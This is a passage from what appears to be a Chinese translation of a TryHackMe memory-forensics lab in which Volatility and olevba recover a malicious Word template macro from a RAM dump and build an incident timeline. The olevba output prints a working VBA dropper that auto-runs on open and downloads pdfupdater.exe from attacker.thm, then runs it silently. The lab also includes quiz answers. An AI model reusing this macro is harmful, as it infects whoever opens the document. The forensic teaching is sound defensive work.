<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_SECTION_OBJECT_POINTERS</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PVOID DataSectionObject</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PVOID SharedCacheMap</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PVOID ImageSectionObject</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SECTION_OBJECT_POINTERS</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>它使用对象的元数据（如文件名和偏移量）来适当地命名转储的文件。 如果文件的数据仍然驻留在内存中。</p>
<p>我们已经在之前的房间中转储了此文件，它应该在<code>5252/</code>目录中可用，但我们可以使用以下命令再次执行：</p>
<p><code>vol -f THM-WIN-001_071528_07052025.mem -o 5252/ windows.dumpfiles --pid 5252</code></p>
<p>一旦我们访问了该文件转储，我们就可以像之前识别具有潜力的<strong>DOTM</strong>文件时那样检查它。 通常，启用宏的文件，如<strong>DOCM</strong>，会在DOTM文件中包含模板。 这就是我们通过转储进程<strong>WINWORD.EXE</strong>在之前的任务中已经找到的文件类型。 我们可以使用grep命令再次搜索它：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">/</span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> dotm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file.0x990b2ae077d0.0x990b2a3f5d70.SharedCacheMap.Normal.dotm.vacb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat</span><br></span></code></pre></div></div>
<p>很好，那么让我们使用命令<code>cp 5252/file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat .</code>将文件复制到我们的主目录，并再次检查它，确认它是一个Word文档文件，就像我们之前使用<code>file</code>命令所做的那样，并确认文件类型为<strong>Word</strong>。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat: Microsoft Word </span><span class="token number" style="color:#36acaa">2007</span><span class="token plain">+</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="确认宏执行">确认宏执行<a href="#确认宏执行" class="hash-link" aria-label="确认宏执行的直接链接" title="确认宏执行的直接链接" translate="no">​</a></h3>
<p>让我们使用命令<code>unzip</code>解压.dat文件，并检查文件。 让我们检查解压后的word/目录。 我们将找到一个名为<strong>vbaProject.bin</strong>的VBA文件。 如果有宏或潜在的恶意代码，它应该在那里，所以我们将使用<code>olevba</code>（<strong>oletools</strong>套件的一部分）通过命令<code>olevba word/vbaProject.bin</code>提取它</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ olevba word/vbaProject.bin </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">XLMMacroDeobfuscator: pywin32 is not installed </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">only is required </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> you want to use MS Excel</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sub AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DownloadAndExecute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sub Document_Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DownloadAndExecute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sub DownloadAndExecute</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim url As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim filePath As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim xmlhttp As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim adoStream As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http:/[REDACTED]/pdfupdater.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    filePath </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:\Users\operator\pdfupdater.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&#x27; Delete file if it already exists</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    If Dir(filePath) &lt;&gt; &quot;&quot; Then Kill filePath</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    Set xmlhttp = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    xmlhttp.Open &quot;GET&quot;, url, False</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    xmlhttp.Send</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    If xmlhttp.Status = 200 Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        Set adoStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        adoStream.Type = 1 &#x27;</span><span class="token plain"> Binary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        adoStream.Open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        adoStream.Write xmlhttp.responseBody</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        adoStream.SaveToFile filePath, </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27; Overwrite existing</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        adoStream.Close</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        Shell filePath, vbHide &#x27;</span><span class="token plain"> Run the </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> silently</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        MsgBox </span><span class="token string" style="color:#e3116c">&quot;Download failed. HTTP status: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> xmlhttp.Status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<p>很好。 我们成功地从内存中恢复了用户执行的宏，该宏很可能是通过文档传递的。 此宏启动了<code>pdfupdater.exe</code>的执行，并揭示了一个URL，可以帮助追踪活动的起源，我们将在接下来的任务中进一步探讨。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 我们使用了哪个命令来确认转储的<code>.dat</code>文件是Microsoft Word文档？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 根据<code>olevba</code>输出，宏下载并执行的文件叫什么名字？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pdfupdater.exe</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 宏中硬编码用于下载可执行文件的完整URL是什么？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://attacker.thm/pdfupdater.exe</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-7-结论">任务 7 结论<a href="#任务-7-结论" class="hash-link" aria-label="任务 7 结论的直接链接" title="任务 7 结论的直接链接" translate="no">​</a></h2>
<p>在这个房间中，我们仅通过内存分析了用户活动，追踪了登录、会话、命令和文件访问。 每个任务都侧重于交互的迹象，帮助我们理解事件期间系统上发生了哪些操作。</p>
<p>我们完全基于RAM数据工作，没有依赖磁盘日志。 遵循这些痕迹，我们构建了用户行为和潜在恶意活动的清晰图景。 到目前为止，我们可以构建一个如下所示的时间线。</p>
<ol>
<li class="">在内存捕获时，用户操作员已登录并处于活动状态：通过会话数据和加载的注册表配置单元确认。 使用 <strong>windows.sessions</strong> 和 <strong>windows.registry.hivelist</strong> volatility 插件。</li>
<li class="">恶意文档 <strong>cv-resume-test.docm</strong> 已通过 Microsoft Word 打开：追踪到 <strong>WINWORD.EXE</strong> 进程和文件句柄。 使用 <strong>windows.cmdline</strong> 和 <strong>windows.handles</strong> volatility 插件。</li>
<li class="">该文档触发了一个包含嵌入宏的链接模板（<strong>.dotm</strong>）：通过检查与 WINWORD.EXE 关联的转储文件对象识别：使用 <strong>windows.dumpfiles</strong> volatility 插件并在进程目录上运行 grep 命令。</li>
<li class="">宏静默执行，从远程服务器下载并运行 pdfupdater.exe：从内存中提取并分析宏内容。 解压 <strong>.dotm</strong> 并在 <strong>vbaProject.bin</strong> 上运行 <strong>olevba</strong>。</li>
<li class="">下载的文件生成了 <strong>windows-update.exe</strong>，随后启动了 updater.exe：通过使用 <strong>pslist</strong>、<strong>cmdline</strong> 和进程祖先关系确认进程关系和创建顺序。</li>
<li class="">通过启动 cmd.exe 和 powershell.exe，利用后活动变得明显：在有效载荷执行后不久，通过 <strong>sessions</strong> 和 <strong>pslist</strong> 在同一会话中观察到活动进程。</li>
<li class="">UserAssist 条目确认启动了如命令提示符等交互式应用程序：使用 <strong>windows.registry.userassist</strong> volatility 插件从操作员的 <strong>NTUSER.DAT</strong> 配置单元中恢复，作为 <strong>GUI驱动</strong> 执行的证据。</li>
</ol>
<p>在本模块的下一房间中，我们将学习如何类似地跟踪和追溯网络连接。 我们还将完成当前正在构建的时间线，以尝试揭示整个攻击链。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 点击以完成房间。 </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Memory Analysis/windowsmemoryanduseractivity.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryandprocs"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Windows内存与进程</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryandnetwork"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Windows内存与网络</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#任务-1-介绍" class="table-of-contents__link toc-highlight">任务 1 介绍</a><ul><li><a href="#学习目标" class="table-of-contents__link toc-highlight">学习目标</a></li><li><a href="#先决条件" class="table-of-contents__link toc-highlight">先决条件</a></li></ul></li><li><a href="#任务2场景信息" class="table-of-contents__link toc-highlight">任务2场景信息</a><ul><li><a href="#场景" class="table-of-contents__link toc-highlight">场景</a></li><li><a href="#事件信息thm-0001" class="table-of-contents__link toc-highlight">事件信息THM-0001</a></li><li><a href="#公司信息tryhatme" class="table-of-contents__link toc-highlight">公司信息TryHatMe</a></li></ul></li><li><a href="#任务3-环境与设置" class="table-of-contents__link toc-highlight">任务3 环境与设置</a></li><li><a href="#任务4-追踪会话" class="table-of-contents__link toc-highlight">任务4 追踪会话</a><ul><li><a href="#会话" class="table-of-contents__link toc-highlight">会话</a></li><li><a href="#已登录会话" class="table-of-contents__link toc-highlight">已登录会话</a></li><li><a href="#查找已加载的注册表配置单元" class="table-of-contents__link toc-highlight">查找已加载的注册表配置单元</a></li><li><a href="#图形界面活动" class="table-of-contents__link toc-highlight">图形界面活动</a></li></ul></li><li><a href="#任务5-命令执行与文件访问" class="table-of-contents__link toc-highlight">任务5 命令执行与文件访问</a><ul><li><a href="#执行" class="table-of-contents__link toc-highlight">执行</a></li><li><a href="#文件访问" class="table-of-contents__link toc-highlight">文件访问</a></li></ul></li><li><a href="#任务6-追踪用户执行" class="table-of-contents__link toc-highlight">任务6 追踪用户执行</a><ul><li><a href="#定位模板文件" class="table-of-contents__link toc-highlight">定位模板文件</a></li><li><a href="#确认宏执行" class="table-of-contents__link toc-highlight">确认宏执行</a></li></ul></li><li><a href="#任务-7-结论" class="table-of-contents__link toc-highlight">任务 7 结论</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/TryHackMe-CN/docs">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/TryHackMyOffsecBox" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - TryHackMyOffsecBox<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/CRONUS-Security" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - CRONUS-Security<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>